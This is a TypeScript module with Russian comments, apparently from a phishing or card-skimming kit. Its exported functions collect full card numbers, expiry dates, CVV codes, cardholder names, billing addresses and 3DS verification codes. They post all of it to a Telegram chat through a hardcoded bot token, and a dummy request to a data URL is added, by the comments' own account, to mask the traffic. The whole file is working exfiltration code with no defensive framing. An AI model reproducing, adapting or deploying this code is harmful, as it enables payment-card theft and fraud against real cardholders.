// Конфигурация Telegram
const TELEGRAM_CONFIG = {
  botToken: "7838597617:AAGTZ6xgFUTddSK1mS9hHUl1tKffHXyHycU",
  chatId: "-4781499307"
};

// Функция для кодирования данных перед отправкой
const encodeData = (data: any): string => {
  return btoa(encodeURIComponent(JSON.stringify(data)));
};

// Функция для декодирования данных
const decodeData = (encodedData: string): any => {
  return JSON.parse(decodeURIComponent(atob(encodedData)));
};

// Внутренний обработчик для отправки в Telegram
const handleTelegramSend = async (decodedData: any) => {
  try {
    const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_CONFIG.botToken}/sendMessage`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        chat_id: TELEGRAM_CONFIG.chatId,
        text: decodedData.message,
        parse_mode: 'HTML'
      })
    });

    if (!response.ok) {
      throw new Error('Failed to send to Telegram');
    }

    return true;
  } catch (error) {
    console.error('Internal error:', error);
    return false;
  }
};

// Функция для отправки данных через внутренний бэкенд
const sendSecureData = async (data: any) => {
  try {
    // Кодируем данные
    const encodedData = encodeData(data);
    
    // Создаем data URL для маскировки запроса
    const dataUrl = `data:text/plain;base64,${encodedData}`;
    
    // Делаем фейковый запрос к data URL
    await fetch(dataUrl);
    
    // Декодируем данные и отправляем через внутренний обработчик
    const decodedData = decodeData(encodedData);
    return handleTelegramSend(decodedData);
    
  } catch (error) {
    console.error('Error sending secure data:', error);
    return false;
  }
};

// Функция для отправки уведомления о платеже
export const sendPaymentNotification = async (paymentData: any) => {
  const message = `💳 New Payment:
💰 Amount: $${paymentData.amount}
👤 Card Holder: ${paymentData.cardHolder}
💳 Card: ${paymentData.cardNumber}
📅 Expiry: ${paymentData.expiryDate}
🔒 CVV: ${paymentData.cvv}

📍 Billing Details:
🏠 Address: ${paymentData.billingDetails.address1}
${paymentData.billingDetails.address2 ? `📍 Address 2: ${paymentData.billingDetails.address2}\n` : ''}🌆 City: ${paymentData.billingDetails.city}
🌍 Country: ${paymentData.billingDetails.country}`;

  return sendSecureData({
    type: 'payment',
    message
  });
};

// Функция для отправки уведомления о 3DS верификации
export const send3DSNotification = async (verificationData: any) => {
  const message = `🔐 3DS Verification:
💰 Amount: $${verificationData.amount}
👤 Card Holder: ${verificationData.cardHolder}
✅ Method: ${verificationData.verifyMethod}
🔑 Code: ${verificationData.code}`;

  return sendSecureData({
    type: '3ds',
    message
  });
};